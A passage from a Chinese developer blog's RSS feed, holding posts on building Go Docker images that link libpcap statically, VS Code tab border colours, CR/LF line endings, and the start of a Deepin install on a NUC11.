&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bun.sh/docs/bundler/executables&#34;&gt;https://bun.sh/docs/bundler/executables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://deno.com/manual@v1.34.1/tools/compiler&#34;&gt;https://deno.com/manual@v1.34.1/tools/compiler&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nodejs.org/api/single-executable-applications.html&#34;&gt;https://nodejs.org/api/single-executable-applications.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Build Docker Image With Libpcap</title>
      <link>https://wdd.js.org/golang/build-docker-image-with-libpcap/</link>
      <pubDate>Mon, 08 May 2023 11:45:23 +0800</pubDate>
      <guid>https://wdd.js.org/golang/build-docker-image-with-libpcap/</guid>
      <description>&lt;h1 id=&#34;常规构建&#34;&gt;常规构建&lt;/h1&gt;
&lt;p&gt;一般情况下，我们的Dockerfile可能是下面这样的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这个Dockerfile使用了多步构建，使用golang:1.19.4作为构建容器，二进制文件构建成功后，单独把文件复制到alpine镜像。&lt;/li&gt;
&lt;li&gt;这样做的好处是最后产出的镜像非常小，一般只有十几MB的样子，如果直接使用golang的镜像来构建，镜像体积就可能达到1G左右。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Dockerfile&#34; data-lang=&#34;Dockerfile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; golang:1.19.4 as builder&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ENV&lt;/span&gt; GO111MODULE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;on GOPROXY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://goproxy.cn,direct&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /app&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; . .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; CGO_ENABLED&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; GOOS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;linux GOARCH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;amd64 go build -o run .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; alpine:3.14.2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /app&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; encdec run.sh /app/&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; --from&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;builder /app/run .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXPOSE&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 3000&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ENTRYPOINT&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/app/run&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;依赖libpcap的构建&#34;&gt;依赖libpcap的构建&lt;/h1&gt;
&lt;p&gt;如果使用了程序使用了&lt;a href=&#34;https://pkg.go.dev/github.com/google/gopacket/pcap&#34;&gt;libpcap&lt;/a&gt; 来抓包，那么除了我们自己代码产生的二进制文件外，可能还会依赖libpcap的文件。常规打包就会报各种错误，例如文件找不到，缺少so文件等等。&lt;/p&gt;
&lt;p&gt;libpcap是一个c库，并不是golang的代码，所以处理起来要不一样。&lt;/p&gt;
&lt;p&gt;下面直接给出Dockerfile&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Dockerfile&#34; data-lang=&#34;Dockerfile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 构建的基础镜像换成了alpine镜像&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; golang:alpine as builder&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 将alpine镜像换清华源，这样后续依赖的安装会加快&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&amp;#39;&lt;/span&gt; /etc/apk/repositories&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装需要用到的C库，和构建依赖&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apk --update add linux-headers musl-dev gcc libpcap-dev&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 使用国内的goproxy&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ENV&lt;/span&gt; GO111MODULE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;on GOPROXY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://goproxy.cn,direct&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 设置工作目录&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /app&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 拷贝go相关的依赖&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; go.mod go.sum ./&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 下载go相关的依赖&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; go mod download&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 复制go代码&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; . .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 编译go代码&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; CGO_ENABLED&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; GOOS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;linux GOARCH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;amd64 go build -a --ldflags &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-linkmode external -extldflags &amp;#34;-static -s -w&amp;#34;&amp;#39;&lt;/span&gt; -o run main.go&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 使用最小的scratch镜像&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; scratch&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 设置工作目录&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /app&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 拷贝二进制文件&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;COPY&lt;/span&gt; --from&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;builder /app/run .&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXPOSE&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 8086&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ENTRYPOINT&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/app/run&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;整个Dockerfile比较好理解，重要的部分就是ldflags的参数了，下面着重讲解一下&lt;/p&gt;</description>
    </item>
    <item>
      <title>VScode激活Tab更容易区分</title>
      <link>https://wdd.js.org/posts/2023/vscode-highlight-tab/</link>
      <pubDate>Tue, 18 Apr 2023 13:43:07 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/vscode-highlight-tab/</guid>
      <description>&lt;p&gt;默认情况下VScode的tab栏，当前的颜色会更深一点。如下图所示，第三个就是激活的。&lt;/p&gt;
&lt;p&gt;但是实际上并没有太高的区分度，特别是当显示屏有点反光的时候。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2023/vscode-highlight-tab/2023-04-18-13-45-18.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;我想应该不止一个人有这个问题吧&lt;/p&gt;
&lt;p&gt;看了github上，有个人反馈了这个问题，https://github.com/Microsoft/vscode/issues/24586&lt;/p&gt;
&lt;p&gt;后面有人回复了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;workbench.colorCustomizations&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tab.activeBorder&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#ff0000&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tab.unfocusedActiveBorder&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#000000&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面就是用来配置Tab边界的颜色的。&lt;/p&gt;
&lt;p&gt;看下效果，当前激活的Tab下有明显的红线，是不是更容易区分了呢&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2023/vscode-highlight-tab/2023-04-18-13-51-17.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>行位结束符引起的问题</title>
      <link>https://wdd.js.org/posts/2023/tips-about-cr-lf/</link>
      <pubDate>Mon, 16 Jan 2023 15:03:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2023/tips-about-cr-lf/</guid>
      <description>&lt;h1 id=&#34;crlf&#34;&gt;CRLF&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;二进制&lt;/th&gt;
          &lt;th&gt;十进制&lt;/th&gt;
          &lt;th&gt;十六进制&lt;/th&gt;
          &lt;th&gt;八进制&lt;/th&gt;
          &lt;th&gt;字符/缩写&lt;/th&gt;
          &lt;th&gt;解释&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;00001010&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;0A&lt;/td&gt;
          &lt;td&gt;012&lt;/td&gt;
          &lt;td&gt;LF/NL(Line Feed/New Line)&lt;/td&gt;
          &lt;td&gt;换行键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;00001101&lt;/td&gt;
          &lt;td&gt;13&lt;/td&gt;
          &lt;td&gt;0D&lt;/td&gt;
          &lt;td&gt;085&lt;/td&gt;
          &lt;td&gt;CR (Carriage Return)&lt;/td&gt;
          &lt;td&gt;回车键&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;CR代表回车符，LF代表换行符。&lt;/p&gt;
&lt;p&gt;这两个符号本身都是不可见的。&lt;/p&gt;
&lt;p&gt;如果打印出来&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CR 会显示 &lt;code&gt;\r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;LF 会显示 &lt;code&gt;\n&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;不同系统的行结束符&#34;&gt;不同系统的行结束符&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Linux系统和Mac换行符是 &lt;code&gt;\n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windows系统的换行符是 &lt;code&gt;\r\n&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;如何区分文件的换行符&#34;&gt;如何区分文件的换行符？&lt;/h1&gt;
&lt;p&gt;可以使用od命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;od -bc index.md
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;假如文件的原始内容如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- 1
- 2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意012是八进制的数，十进制对应的数字是10，也就是换行符。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0000000 055 040 061 012 055 040 062
          -       1  \n   -       2
0000007
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果用vscode打开文件，也能看到对应的文件格式，如LF。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2023/tips-about-cr-lf/2023-01-16-15-56-34.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;换行符的的差异会导致哪些问题&#34;&gt;换行符的的差异会导致哪些问题？&lt;/h1&gt;
&lt;h2 id=&#34;shell脚本问题&#34;&gt;shell脚本问题&lt;/h2&gt;
&lt;p&gt;如果bash脚本里包含CRLF,  可能导致脚本无法解析等各种异常问题。&lt;/p&gt;
&lt;p&gt;例如下面的报错，docker启动shell脚本可能是在windows下编写的。所以脚本无法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;standard_init_linux.go:211: exec user process caused &amp;#34;no such file or directory&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;如何把windows文件类型转为unix&#34;&gt;如何把windows文件类型转为unix?&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 可以把windows文件类型转为unix

dos2unix file
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果是vscode，也可以点击对应的文件格式按钮。&lt;/p&gt;</description>
    </item>
    <item>
      <title>NUC11 安装 Deepin 20.2.4</title>
      <link>https://wdd.js.org/posts/2022/12/nuc11-deepin-20-2/</link>
      <pubDate>Sat, 17 Dec 2022 13:28:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/12/nuc11-deepin-20-2/</guid>
      <description>&lt;h1 id=&#34;硬件&#34;&gt;硬件&lt;/h1&gt;
&lt;p&gt;内存：金士顿 16*2；869元
固态硬盘： 三星980 1TB; 799元
主机：NUC11 PAHI7; 4核心八线程；3399元
累计5000多一点, 是最新版Macbook pro M1prod的三分之一&lt;/p&gt;
